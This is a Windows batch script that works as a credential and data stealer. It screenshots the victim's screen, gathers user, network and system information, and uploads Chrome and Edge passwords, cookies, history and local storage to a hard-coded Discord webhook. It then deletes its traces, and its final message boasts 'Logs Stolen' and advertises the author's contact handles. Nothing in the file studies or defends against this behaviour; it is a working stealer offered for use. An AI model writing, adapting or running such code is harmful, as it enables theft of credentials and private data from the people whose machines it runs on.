@echo off
timeout 2
cd %appdata%
set "webhook=https://discord.com/api/webhooks/1027903545539829760/_J2fmsKmmpalM-Z3cQ76_VBI6ljt_sZVftONmhMn1FBDHwBSI0rwesRJLBd8YWCjDnV5"

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```--------------------------------------------------------------------------```\"}" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```New Session !!```\"}" %webhook%



curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot from %ComputerName% @ %TIME%```\"}" %webhook%


curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
.\s.exe -o %appdata%\s.png
curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook%
set "tempsys3=%appdata%\sysinfo.txt"
set "tempsys1=%appdata%\whoami.txt"
set "tempsys2=%appdata%\ipconfig.txt"
set "tempsys4=%appdata%\dir.txt"
set "tempsys0=%appdata%\netuser.txt"
2>NUL net user > "%tempsys0%"
2>NUL whoami > "%tempsys1%"
2>NUL ipconfig > "%tempsys2%"
2>NUL systeminfo > "%tempsys3%"
2>NUL dir > "%tempsys4%"

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Device Info --------```\"}" %webhook%

curl --silent --output /dev/null -F dir=@"%tempsys0%" %webhook%
curl --silent --output /dev/null -F dir=@"%tempsys1%" %webhook%
curl --silent --output /dev/null -F dir=@"%tempsys2%" %webhook%
curl --silent --output /dev/null -F dir=@"%tempsys3%" %webhook%
curl --silent --output /dev/null -F dir=@"%tempsys4%" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Google Chrome Logs --------```\"}" %webhook%

curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_cookie.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_extension.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_history.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_localstorage.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_password.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Microsoft Edge Logs --------```\"}" %webhook%

curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_bookmark.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_cookie.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_download.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_history.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_localstorage.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_password.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_user_1_extension.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_user_1_localstorage.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Sessions Done !! ... Logs Stolen 😈  Contact Me In Telegram: @HexBuddy127001  My Instagram: hex_buddy ---------```\"}" %webhook%


del %appdata%\s.exe
del %appdata%\s.png
del %appdata%\sysinfo.txt
del %appdata%\netuser.txt
del %appdata%\dir.txt
del %appdata%\ipconfig.txt
del %appdata%\whoami.txt
del Results4HackedPC.zip
del Results4HackedPC
pause